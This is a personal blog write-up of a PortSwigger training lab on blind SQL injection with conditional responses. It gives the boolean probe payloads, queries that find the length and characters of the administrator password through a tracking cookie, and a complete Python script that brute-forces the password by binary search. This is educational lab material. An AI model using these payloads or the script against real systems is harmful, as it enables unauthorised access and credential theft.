+++
date = '2026-07-15T15:15:16+08:00'
draft = false
title = "Blind SQL injection with conditional responses | <span style=\"color:#3498db\">Practitioner</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = 'Painfully long lab, Python bruteforce script included'
showLastUpdated = true
+++

The problem statement states that there is a *tracking cookie* used, and the server performs SQL queries containing the value of the submitted cookie. The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

And the database contains a different table called `users`, with columns called `username` and `password`. So no need for database type and version fingerprinting.
![](/images/viber_image_2026-07-15_15-20-13-664.png)

We first need to verify whether SQLi works or not, but whatever queries sent using the values of `TrackingId` is not visible client-side, except for that `Welcome back` message. This will be our verification. We can trigger different responses conditionally, if that message is visible then our query is valid and vice versa. Let's start by injecting `'AND 1=1--` and `'AND 1=2--` respectively, one guaranteed true and one guaranteed false query:
![](/images/viber_image_2026-07-15_15-22-19-085.png)
![](/images/viber_image_2026-07-15_15-22-54-302.png)
Notice that for the false query, there is no `Welcome back`, meaning that our query *is accepted and processed server-side*. Knowing this and the existence of the `users` table, we can start bruteforcing the password for `administrator`.

First, we'll need to know the **length** of the password. There is a really nice SQL query that does this (quite long tho):
```sql
AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > 1) = 'a'--
```
Basically the `SELECT` is guaranteed to return `a` if and only if the length of `password` satisfies whatever condition we put inside:
![](/images/viber_image_2026-07-15_15-40-28-871.png)
This confirms the password is at least 1-character long (shockers). We can keep incrementing the number over and over until we get the correct length, in this case it's 20:
![](/images/viber_image_2026-07-15_15-40-51-515.png)
With the length obtained, we can start bruteforcing with this lovely query. It's similar to the above but this time we are comparing strings instead:
```sql
AND (SELECT 'a' FROM users WHERE username = 'administrator' AND password > 'a') = 'a'--
```
Note that the problem statement explicitly mentions the password only contains lowercase and alphanumeric characters, which shortens our list down to 36 characters (a-z, 0-9).

At this point, we can either bruteforce 36^20 possible passwords (pls no), bruteforce each character one-by-one manually, or write some leet script that automates everything (pls yes). In this case, I opted for the last option. The algorithm is nothing complex, it's just binary search with some string formatting involved. One with at least 1 hour leetcoding can probably write this script no problemo.

In the case you want to use the script for yourself right away:
```python
import requests

url= "https://<lab-id>.web-security-academy.net/filter?category=Gifts"
cookie_string = "TrackingId=<id>' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,1,{current_length})>'{current_password}')='a'--; session=<session>"
password = ""
password_length = 20
target_string = "Welcome back!"

wordlist = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
            'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
            'w', 'x', 'y', 'z']

for current_length in range(1, password_length + 1):
    response = ""
    l, r = 0, len(wordlist) - 1
    
    # Binary search each character
    while l < r:
        mid = (l + r) // 2
        
        headers = {
            "Cookie": cookie_string.format(current_length=current_length, current_password=password + wordlist[mid])
        }
        
        response = requests.get(url, headers=headers)
        
        # Current character has ASCII value lower than or equal to wordlist[mid]
        if target_string not in response.text:
            r = mid
        # Current character has ASCII value higher than wordlist[mid]
        else:
            l = mid + 1
            
    password += wordlist[l]
    print(password)
```
After running the script, we can obtain the full password for `administrator`:
![](/images/viber_image_2026-07-15_16-53-15-198.png)
In reality, most sites will include stricter password policies (at least one uppercase, one unique symbol, etc) so the wordlist will be very much larger than 36 characters, which means the time taken to bruteforce will be *much much longer*. This goes to show how using only lowercase alphanumeric can be broken quite easily, and you should always make your password complex and unpredictable.